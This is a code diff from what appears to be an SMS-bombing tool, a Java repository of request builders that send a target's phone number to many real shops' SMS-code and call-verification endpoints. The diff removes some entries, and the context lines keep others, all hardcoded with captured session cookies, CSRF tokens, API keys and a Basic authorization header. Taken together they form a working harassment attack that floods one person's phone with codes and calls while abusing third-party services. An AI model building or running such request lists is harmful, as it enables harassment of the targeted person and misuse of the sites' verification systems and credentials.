@@ -27,6 +27,7 @@ import java.util.Arrays;
 import java.util.Date;
 import java.util.List;
 import java.util.Objects;
+import java.util.Random;
 
 import okhttp3.Call;
 import okhttp3.Headers;
@@ -193,25 +194,6 @@ public class DefaultRepository implements ServicesRepository {
                     }
                 },
 
-                new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
-                    @Override
-                    public String buildJson(Phone phone) {
-                        JSONObject json = new JSONObject();
-
-                        try {
-                            json.put("PhoneNumber", phone.toString());
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
-
-                        request.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
-                        request.addHeader("Connection", "Keep-Alive");
-                        request.addHeader("Accept-Encoding", "gzip");
-
-                        return json.toString();
-                    }
-                },
-
                 new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                     @Override
                     public void buildParams(Phone phone) {
@@ -239,23 +221,6 @@ public class DefaultRepository implements ServicesRepository {
                         }
 
                         return json.toString();
-                    }
-                },
-
-                new Service(7) {
-                    @Override
-                    public void run(OkHttpClient client, Callback callback, Phone phone) {
-                        client.newCall(new Request.Builder()
-                                .url("https://pizzaco.ru/api/user/generate-password")
-                                .header("Cookie", "upkvartal-frontend=t466jslnqhsc8ffkaqlf65bnfg; _csrf-frontend=eca7110ac5f6820f172812ae76b93ea6f91976b5374d49b3e50823904e661505a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22MqdE5DQapqSuoKww3kzp22qKVRklmP2O%22%3B%7D; _ym_uid=1656577574308706185; _ym_d=1656577574; _ym_visorc=w; _ym_isad=2; advanced-api=cm1ium0dmmq1nbveiinjdiku16; api-key=4e661934-f84e-11ec-9a5c-d00d1849d38c; app-settings=%7B%22promo_text%22%3Anull%2C%22cart_suggest_header%22%3Anull%2C%22seo_info%22%3A%7B%22title%22%3A%22%D0%93%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F%22%2C%22description%22%3Anull%7D%2C%22auth_by_call%22%3Afalse%2C%22voice_call_auth%22%3Afalse%2C%22has_promo_advice%22%3Afalse%2C%22ask_address_on_first_enter%22%3Atrue%2C%22ask_address_on_add_to_cart%22%3Atrue%2C%22min_order_value%22%3A600%2C%22order_disable_card_for_weight%22%3Afalse%2C%22app_store_id%22%3A%22app%22%2C%22order_cart_to_courier%22%3Atrue%2C%22order_auth%22%3Afalse%2C%22takeaway_enabled%22%3Atrue%2C%22not_heat%22%3Afalse%2C%22default_persons_count%22%3A%221%22%2C%22order_to_time%22%3Afalse%2C%22show_not_call%22%3Afalse%2C%22order_show_persons%22%3Atrue%2C%22disable_order%22%3Afalse%2C%22default_phone%22%3A%22%2B7(812)220-01-02%22%2C%22auth_enabled%22%3Atrue%2C%22catalog_currency_symbol%22%3A%22%D0%A0%22%2C%22app_menu%22%3A%5B%7B%22id%22%3A10%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A11%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata-mobil%22%7D%7D%5D%2C%22footer_menu%22%3A%5B%7B%22id%22%3A1%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A2%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A8%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A9%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22mobile_menu%22%3A%5B%7B%22id%22%3A5%2C%22title%22%3A%22%D0%9C%D0%B5%D0%BD%D1%8E%22%7D%2C%7B%22id%22%3A3%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A4%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A6%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A7%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22header_menu%22%3A%5B%5D%2C%22combine_promo_and_bonus%22%3Afalse%2C%22order_disable_cash%22%3Afalse%2C%22loyalty_program%22%3A%7B%22enabled%22%3Afalse%7D%2C%22whatsapp%22%3Anull%2C%22tg%22%3Anull%2C%22privacy_link%22%3Anull%2C%22promo_link%22%3A%22http%3A%2F%2Fabout.mnogolososya.ru%2Freceive_advertising%22%2C%22instagram%22%3Anull%2C%22vk%22%3Anull%2C%22facebook%22%3Anull%2C%22update_privacy%22%3Afalse%2C%22main_logo%22%3A%22https%3A%2F%2Fthapl-public.storage.yandexcloud.net%2F%2Fimg%2FSiteSetting%2F7eb85221f6c97c13f93532fffc1edc42_origin_.svg%22%2C%22additional_logo%22%3Anull%2C%22header_background%22%3A%22https%3A%2F%2Fstorage.yandexcloud.net%2Fthapl-public%2F%2Fimg%2FSiteSetting%2F74dff64b5b8cff080bc39a5678b2107d_origin.png%22%2C%22order_to_time_disable_holidays%22%3Atrue%2C%22order_to_time_min_gap_days%22%3A0%2C%22order_to_time_max_gap_days%22%3A2%2C%22start_up_promos%22%3A%5B%5D%2C%22check_region%22%3Afalse%7D")
-                                .header("x-thapl-apitoken", "4e661934-f84e-11ec-9a5c-d00d1849d38c")
-                                .post(RequestBody.create("------WebKitFormBoundaryMQ1naEW4T6mNqlQx\n" +
-                                                "Content-Disposition: form-data; name=\"phone\"\n" +
-                                                "\n" +
-                                                Phone.format(phone.getPhone(), "+7 *** *** ** **\n") +
-                                                "------WebKitFormBoundaryMQ1naEW4T6mNqlQx--",
-                                        MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMQ1naEW4T6mNqlQx")))
-                                .build()).enqueue(callback);
                     }
                 },
 
@@ -883,22 +848,6 @@ public class DefaultRepository implements ServicesRepository {
                     }
                 },
 
-                new JsonService("https://lk.mysbertips.ru/sbrftips-proxy/registration/newotp", 7) {
-                    @Override
-                    public String buildJson(Phone phone) {
-                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61");
-                        request.header("Cookie", "SESSION=NDJiYWE0MmUtMWNjMy00YmFmLWIyZWMtMTRkZDNjNGQwMWM3; _ym_uid=1674665215289598227; _ym_d=1674665215; _sa=SA1.2d07e266-09de-4fa9-b232-1d8a9ef458e3.1674665214; adtech_uid=24a2176e-f8b2-4682-812e-326068cb377d:mysbertips.ru; user-id_1.0.5_lr_lruid=pQ8AAP9c0WMDffReAW1bjQA=; _ym_isad=2; _ym_visorc=w");
-
-                        try {
-                            return new JSONObject()
-                                    .put("login", phone.getPhone())
-                                    .toString();
-                        } catch (JSONException e) {
-                            return null;
-                        }
-                    }
-                },
-
                 new ParamsService("https://www.elmarket.by/public/ajax/sms_reg.php", 375) {
                     @Override
                     public void buildParams(Phone phone) {
@@ -1089,45 +1038,6 @@ public class DefaultRepository implements ServicesRepository {
                     }
                 },
 
-                new JsonService("https://sushiwok.ru/user/phone/validate", 7) {
-                    @Override
-                    public String buildJson(Phone phone) {
-                        request.header("x-csrf-token", "KxUtYXrV-FfrHJ6ZLIcCuyZqv7GSWVmfzf8M");
-                        request.header("x-requested-with", "XMLHttpRequest");
-                        request.header("cookie", "_csrf=p4ZnbhHfcQYr8Qbp0lGWTLlq; connect.sid=s:gqjmNZSZipi0Du2DyS9mWHQvB56fAS04.87oxCkV/g3cERTuw/eR2kzyKkzyH32Il1SnfYdZl6Js; _sticky_param=4; _gid=GA1.2.1525497464.1676386386; _gcl_au=1.1.1311383257.1676386386; tmr_lvid=d0323dada0a19b9780be03fd69d9b9bd; tmr_lvidTS=1651933668037; _gat_gtag_UA_88670217_1=1; _gat_ITRZ=1; _gat_SPB=1; _gat_GA=1; _ym_uid=1651933669991734830; _ym_d=1676386387; _ym_isad=2; parameterURL=https://sushiwok.ru/spb/profile/; lgvid=63eba053d2225a00019e6ffd; lgkey=a9068628303b848d1d311b37fa95b8a3; _ym_visorc=w; _tt_enable_cookie=1; _ttp=ceLZ07HWH_ygNJkoURbiQwbRQxW; tmr_detect=0|1676386389144; _ga_TE53H5X77H=GS1.1.1676386386.1.1.1676386389.0.0.0; _ga=GA1.2.232668185.1676386386; _gat_gtag_UA_88670217_10=1");
-                        request.header("referer", "https://sushiwok.ru/spb/profile/");
-                        request.header("Sec-Fetch-Dest", "empty");
-                        request.header("Sec-Fetch-Mode", "cors");
-                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
-                        request.header("sec-ch-ua-mobile", "?0");
-                        request.header("sec-ch-ua-platform", "\"Windows\"");
-                        request.header("Sec-Fetch-Site", "same-site");
-                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41");
-                        request.header("origin", "https://sushiwok.ru");
-
-                        try {
-                            return new JSONObject()
-                                    .put("phone", Phone.format(phone.getPhone(), "+7(***)***-**-**"))
-                                    .put("numbers", "4")
-                                    .toString();
-                        } catch (JSONException e) {
-                            return null;
-                        }
-                    }
-                },
-
-                new JsonService("https://spb.uteka.ru/rpc/?method=auth.GetCode", 7) {
-                    @Override
-                    public String buildJson(Phone phone) {
-                        request
-                                .header("platform", "Desktop")
-                                .header("version", "299a1566")
-                                .header("Cookie", "utid=uRELsmP93dxv200sAyHgAg==; _ym_uid=1677581792865430072; _ym_d=1677581792; _ym_isad=2; _gid=GA1.2.1174750557.1677581792; _gat_gtag_UA_117125065_1=1; _ga=GA1.1.567396639.1677581792; _ga_BQFFN693N9=GS1.1.1677581791.1.0.1677581799.0.0.0; _ym_visorc=b");
-
-                        return "{\"jsonrpc\":\"2.0\",\"id\":7,\"method\":\"auth.GetCode\",\"params\":{\"phone\":\"" + phone.getPhone() + "\",\"mustExist\":false,\"sendRealSms\":true}}";
-                    }
-                },
-
                 new CurlService("curl 'https://lgcity.ru/ajax/Auth/SmsSend/' \\\n" +
                         "  -H 'authority: lgcity.ru' \\\n" +
                         "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
@@ -1299,13 +1209,6 @@ public class DefaultRepository implements ServicesRepository {
                     }
                 },
 
-                new ParamsService("https://www.vodovoz-spb.ru/udata/users/user_phone/.json", 7) {
-                    @Override
-                    public void buildParams(Phone phone) {
-                        builder.addQueryParameter("phone", Phone.format(phone.getPhone(), "+7 (***) ***-**-**"));
-                    }
-                },
-
                 new FormService("https://hvalwaters.ru/register/send-sms-code/", 7) {
                     @Override
                     public void buildBody(Phone phone) {
@@ -1440,25 +1343,6 @@ public class DefaultRepository implements ServicesRepository {
                     }
                 },
 
-                new FormService("https://online.globus.ru/?hyper=5011&utm_source=globus.ru&utm_medium=menu&utm_campaign=online.globus.ru&utm_content=shapka-sajta", 7) {
-                    @Override
-                    public void buildBody(Phone phone) {
-                        request.headers(
-                                new Headers.Builder()
-                                        .add("bx-ajax", "true")
-                                        .add("referer", "https://online.globus.ru/?hyper=5011&utm_source=globus.ru&utm_medium=menu&utm_campaign=online.globus.ru&utm_content=shapka-sajta")
-                                        .addUnsafeNonAscii("Cookie", "globus_hyper_id=73; areal_user_change_city=krasnogorsk; globus_hyper_name=Красногорск; _ym_uid=1664469178997278156; _ym_d=1677585277; _fbp=fb.1.1677585277552.1677594909; _gid=GA1.2.1742009735.1681051545; _ym_isad=2; _ym_visorc=w; globus_hyper_show_select=1; _source=globus.ru; url_hyper_id=5011; online_hyper_id=5011; BITRIX_SM_SALE_UID=bb2579f9d0a9f9db5049c979d5cf5464; BITRIX_SM_GUEST_ID=21741551; rrpvid=327738943289815; flocktory-uuid=2df10288-6654-490d-94b7-7ab941005cd1-7; advcake_session_id=30746353-5e1c-577e-3938-2928cdfc6d66; advcake_track_url=https://online.globus.ru/?hyper=5011&utm_source=globus.ru&utm_medium=menu&utm_campaign=online.globus.ru&utm_content=shapka-sajta; advcake_utm_partner=online.globus.ru; advcake_utm_webmaster=shapka-sajta; advcake_click_id=; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22; g4c_x=1; _gcl_au=1.1.844509765.1681051553; _gasessionid=20b3d9a6-c350-45c1-a6bb-6b4d1ef7834e; gtm-session-start=1681051552603; pages_cnt=2; hypermarket=Ð“Ð»Ð¾Ð±ÑƒÑ\u0081 ÐšÑ€Ð°Ñ\u0081Ð½Ð¾Ð³Ð¾Ñ€Ñ\u0081Ðº; tmr_lvid=8b138313c85db7519bfc51951d12f393; tmr_lvidTS=1681051552987; st_uid=0639fd1ba9cd8effe5b8f5060da0d2a2; BITRIX_CONVERSION_CONTEXT_s2={\"ID\":60,\"EXPIRE\":1681073940,\"UNIQUE\":[\"conversion_visit_day\"]}; rai_new=6a6d288901a10983aa53ff2df67ac730; adrdel=1; adrcid=Ats7lVWd-xTEYAobZkom0YQ; analytic_id=1681051557269; timeSent=1; globusid=TUbN6Ig2NRhGT5emehZfeayed0RV7XmV; advcake_track_id=4c80f385-cdd2-7a8f-226f-c893466b602e; pagesCount=1; _ga_WYXVN1FFMV=GS1.1.1681051552.1.1.1681052245.60.0.0; _ga=GA1.2.66925213.1677585277; _gaclientid=66925213.1677585277; _gat_UA-6261130-10=1; tmr_detect=0|1681052248658; _gahitid=2023-04-09T17:57:31.332+03:00")
-                                        .build()
-                        );
-
-                        builder
-                                .add("AUTH_FORM", "Y")
-                                .add("TYPE", "AUTH")
-                                .add("FORM[AUTH_TYPE]", "PHONE")
-                                .add("FORM[PHONE]", phone.format("+7 (***) ***-**-**"));
-                    }
-                },
-
                 new JsonService("https://sushisell.goulash.tech/api/user/register", 7) {
                     @Override
                     public String buildJson(Phone phone) {
@@ -1468,65 +1352,6 @@ public class DefaultRepository implements ServicesRepository {
                                 .header("x-api-key", "5349854");
 
                         return "{\"phone\":\"" + phone.getPhone() + "\",\"password\":\"qwertyuiop\",\"password_repeat\":\"qwertyuiop\",\"verify_type\":\"call\"}";
-                    }
-                },
-
-                new FormService("https://yaposhka-kurgan.ru/user/ajax.php?do=sms_code", 7) {
-                    @Override
-                    public void buildBody(Phone phone) {
-                        request.header("Cookie", "__ddg1_=wJptxJVBMrU9lG19rHQD; PHPSESSID=94c8b47f3ae1f7799422b4a2cbf51b92; _ym_uid=1681491220765009924; _ym_d=1681491220; _ym_visorc=w; _ym_isad=2");
-
-                        builder.add("phone", phone.format("8(***)***-**-**"));
-                    }
-                },
-
-                new FormService("https://ninjapizza.ru/local/ajax/auth.php", 7) {
-                    @Override
-                    public void buildBody(Phone phone) {
-                        builder
-                                .add("action", "sendConfirmCode")
-                                .add("phone", phone.format("+7(***) ***-**-**"));
-
-                        request.header("Sec-Fetch-Dest", "empty");
-                        request.header("Sec-Fetch-Mode", "cors");
-                        request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
-                        request.header("sec-ch-ua-mobile", "?0");
-                        request.header("sec-ch-ua-platform", "\"Windows\"");
-                        request.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36");
-
-                        request
-                                .header("Referer", "https://ninjapizza.ru/")
-                                .header("Cookie", "PHPSESSID=3f5c44a55d3c84848882848cdab3ad97; BITRIX_SM_SALE_UID=f56452f388c6da46e11626c0a6cfeaed; tmr_lvid=6b25f8b340361caef2cd67e9b109a79f; tmr_lvidTS=1681491423621; mgo_sb_migrations=1418474375998%3D1; mgo_sb_current=typ%3Dtypein%7C%2A%7Csrc%3D%28direct%29%7C%2A%7Cmdm%3D%28none%29%7C%2A%7Ccmp%3D%28none%29%7C%2A%7Ccnt%3D%28none%29%7C%2A%7Ctrm%3D%28none%29%7C%2A%7Cmango%3D%28none%29; mgo_sb_first=typ%3Dtypein%7C%2A%7Csrc%3D%28direct%29%7C%2A%7Cmdm%3D%28none%29%7C%2A%7Ccmp%3D%28none%29%7C%2A%7Ccnt%3D%28none%29%7C%2A%7Ctrm%3D%28none%29%7C%2A%7Cmango%3D%28none%29; mgo_sb_session=pgs%3D1%7C%2A%7Ccpg%3Dhttps%3A%2F%2Fninjapizza.ru%2F; mgo_uid=P6pVWSUkgdX0sMtBtjz3; mgo_cnt=1; mgo_sid=vjiprt473411001l5o23; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; isScrollRoistat=1; roistat_visit=2383899; roistat_first_visit=2383899; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=4a291964-49f2-48d8-b032-a6c1ac8bba17; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; leadhunter_expire=1; ___dc=99f81639-c3b6-4e9c-8e58-63098c62bbe8; roistat_leadHunterScriptsShownCount={\"undefined\":1}; tmr_detect=0|1681491426317; _ym_uid=1681491429372068174; _ym_d=1681491429; _ym_isad=2; _ym_visorc=w; roistat_leadHunterCaught=1; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit,leadhunter_expire,roistat_leadHunterScriptsShownCount,roistat_leadHunterCaught")
-                                .header("X-Requested-With", "XMLHttpRequest");
-                    }
-                },
-
-                new JsonService("https://xn--90aamkcop0a.xn--p1ai/api/v5/user/start-authorization", 7) {
-                    @Override
-                    public String buildJson(Phone phone) {
-                        request.header("Cookie", "JSESSIONID=97F79F14935101AB3241D4742C29D515; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=ru; _ga=GA1.2.495684227.1681492282; _gid=GA1.2.1281782739.1681492282; _gat_my_tracker=1; _ym_uid=1644592791844501814; _ym_d=1681492282; _ym_visorc=w; v1_referrer_callibri=; v1_data=; _ym_isad=2; callibri_get_request=1681492294580");
-
-                        return phone.format("{\"phone\":\"+7 *** ***-**-**\"}");
-                    }
-                },
-
-                new FormService("https://sushifuji.ru/get_code_for_call_phone_authorization_site.php", 7) {
-                    @Override
-                    public void buildBody(Phone phone) {
-                        request.header("Cookie", "sushifuji=WUwDv1oiRaXbj,K,0Z2374kSXYs1kwhTYu8bVX7MHn9brJFu; order_delivery_type=pickup; deviceId=b34371ffdefbfc3891eab2d54b0223fc; _ga=GA1.2.167094567.1681493376; _gid=GA1.2.1452399728.1681493376; _gat_gtag_UA_26277425_1=1; tmr_lvid=be8a32b94c9b95c3acd6e87400b6921d; tmr_lvidTS=1681493376335; _ym_uid=1681493377773716892; _ym_d=1681493377; _ym_isad=2; _ym_visorc=w; city_id=2; city_url=perm; cart_products={}; tmr_detect=0|1681493380477");
-
-                        builder.add("phone", phone.toString());
-                    }
-                },
-
-                new FormService("https://sushifuji.ru/get_code_for_sms_authorization_site.php", 7) {
-                    @Override
-                    public void buildBody(Phone phone) {
-                        request.header("Cookie", "sushifuji=WUwDv1oiRaXbj,K,0Z2374kSXYs1kwhTYu8bVX7MHn9brJFu; order_delivery_type=pickup; deviceId=b34371ffdefbfc3891eab2d54b0223fc; _ga=GA1.2.167094567.1681493376; _gid=GA1.2.1452399728.1681493376; tmr_lvid=be8a32b94c9b95c3acd6e87400b6921d; tmr_lvidTS=1681493376335; _ym_uid=1681493377773716892; _ym_d=1681493377; _ym_isad=2; _ym_visorc=w; city_id=2; city_url=perm; cart_products={}; tmr_detect=0|1681493380477");
-
-                        builder
-                                .add("confirm_repeat", "true")
-                                .add("phone_sms", phone.toString());
                     }
                 },
 
@@ -1565,26 +1390,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                         "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                         "  --data-raw '{\"phone\":\"{phone}\"}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://api.kazanexpress.ru/api/signin/phone' \\\n" +
-                        "  -H 'authority: api.kazanexpress.ru' \\\n" +
-                        "  -H 'accept: application/json' \\\n" +
-                        "  -H 'accept-language: ru' \\\n" +
-                        "  -H 'access-content-allow-origin: *' \\\n" +
-                        "  -H 'authorization: Basic a2F6YW5leHByZXNzLWN1c3RvbWVyOmN1c3RvbWVyU2VjcmV0S2V5' \\\n" +
-                        "  -H 'content-type: application/json' \\\n" +
-                        "  -H 'origin: https://kazanexpress.ru' \\\n" +
-                        "  -H 'referer: https://kazanexpress.ru/' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-site' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-iid: a01c9fc3-2536-483f-9a30-d5e01b906b6e' \\\n" +
-                        "  --data-raw '\"{phone}\"' \\\n" +
                         "  --compressed", 7),
 
                 new CurlService("curl 'https://api.sushcof.ru/api/user/register' \\\n" +
@@ -1628,41 +1433,6 @@ public class DefaultRepository implements ServicesRepository {
                         "  -H 'x-csrf-token;' \\\n" +
                         "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                         "  --data-raw '{\"phone\":\"+{phone:7(***) ***-****}\"}' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://www.kspecmash.ru/ajax/confirm_phone.php?PHONE={formatted_phone:+*(***)***-**-**}&ACTION=CHECK_PHONE' \\\n" +
-                        "  -H 'authority: www.kspecmash.ru' \\\n" +
-                        "  -H 'accept: */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'cookie: PHPSESSID=xOsNETHAj3sdca051micg66I5s5FeqaV; BITRIX_SM_GUEST_ID=3821030; BITRIX_SM_SALE_UID=3fe7ebbad93048adea8a33d1565d7f56; _ym_uid=1682936034819024888; _ym_d=1682936034; _gid=GA1.2.933401020.1682936034; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1682974740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_isad=2; cted=modId%3Dxozu5mri%3Bclient_id%3D1774221769.1682936034%3Bya_client_id%3D1682936034819024888; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_visorc=w; BITRIX_SM_RS_MY_LOCATION=a%3A11%3A%7Bs%3A2%3A%22ID%22%3Bs%3A2%3A%2220%22%3Bs%3A4%3A%22NAME%22%3Bs%3A24%3A%22%D0%AD%D0%BB%D0%B5%D0%BA%D1%82%D1%80%D0%BE%D1%81%D1%82%D0%B0%D0%BB%D1%8C%22%3Bs%3A4%3A%22CODE%22%3Bs%3A10%3A%220000031716%22%3Bs%3A8%3A%22LATITUDE%22%3Bs%3A8%3A%220.000000%22%3Bs%3A9%3A%22LONGITUDE%22%3Bs%3A8%3A%220.000000%22%3Bs%3A11%3A%22REGION_NAME%22%3Bs%3A35%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%3Bs%3A11%3A%22REGION_CODE%22%3Bs%3A10%3A%220000028025%22%3Bs%3A21%3A%22COUNTRY_DISTRICT_NAME%22%3Bs%3A10%3A%22%D0%A6%D0%B5%D0%BD%D1%82%D1%80%22%3Bs%3A21%3A%22COUNTRY_DISTRICT_CODE%22%3Bs%3A10%3A%220000028024%22%3Bs%3A12%3A%22COUNTRY_NAME%22%3Bs%3A12%3A%22%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F%22%3Bs%3A12%3A%22COUNTRY_CODE%22%3Bs%3A10%3A%220000028023%22%3B%7D; _ga_7B33G1M8EY=GS1.1.1682936033.1.1.1682936037.0.0.0; _ga=GA1.1.1774221769.1682936034; BITRIX_SM_LAST_VISIT=01.05.2023%2013%3A14%3A05' \\\n" +
-                        "  -H 'referer: https://www.kspecmash.ru/?_r=7254' \\\n" +
-                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
-                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
-                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
-                        "  -H 'sec-fetch-dest: empty' \\\n" +
-                        "  -H 'sec-fetch-mode: cors' \\\n" +
-                        "  -H 'sec-fetch-site: same-origin' \\\n" +
-                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
-                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
-                        "  --compressed", 7),
-
-                new CurlService("curl 'https://vladimir.holodilnik.ru/ajax/user/get_tpl.php?84.2968488677933' \\\n" +
-                        "  -H 'authority: vladimir.holodilnik.ru' \\\n" +
-                        "  -H 'accept: */*' \\\n" +
-                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
-                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
-                        "  -H 'cookie: OrderUserType=1; region_position_nn=24; clean=1; new_reg=2; fcg_favourite_new=2; fcg_change_list_view=2; HRUSIDSHORT=79e451eabaa7e7bcbb9d261769897ef3; HRUSID=9cf0c1df15c910217e7e1e885ae60921; HRUSIDLONG=03db12514ed1285de946a5045cdaa9be; csrfnews=2e620195b99934f61c273d0f5101c24a; _utmx=9cf0c1df15c910217e7e1e885ae60921; action_blocks=; banners_rotations=1181; _ym_uid=1673961868198063374; _ym_d=1682939583; _ga=GA1.2.1886752553.1682939583; _gid=GA1.2.138777877.1682939583; _gat=1; _utmz=2cebd56ce5cbf15d6e6fdaa7d46aa40551ade24425f8530e480df12b1823376e; _ym_isad=2; _ym_visorc=b; _userGUID=0:lh4qrxub:HaBOrCVTH89YheIrbccmv4aFWJ7kifO3; dSesn=990cb0bc-d739-8059-d8f2-4d073b3b1358; _dvs=0:lh4qrxub:yonBY8hNIvx96VZ3g2KsueapG7hvr6bB; PHPSESSID=26e66e6cf387eeca097721c152f466d7; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ga_EHP29G0JCQ=GS1.1.1682939582.1.0.1682939584.0.0.0; tmr_lvid=668db02d45d79ad233216bc3a7aef88b; tmr_lvidTS=1673961864893; advcake_track_id=8eb27bb2-d5ab-4f4e-7495-c0b4ec2af547; advcake_session_id=55329c31-2845-bbae-56f1-b00014f162bf; flocktory-uuid=e429bd85-39fc-4d6b-9b57-d6abe16258af-3; _gp1000247C={\"hits\":1,\"vc\":1}; _gpVisits={\"isFirstVisitDomain\":true,\"idContainer\":\"1000247C\"}; adrdel=1; adrcid=AmTu7d3PvGhZIQULiIyZaCQ; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1682939587528' \\\n" +
-                        "  -H 'origin: https://vladimir.holodilnik.ru' \\\n" +
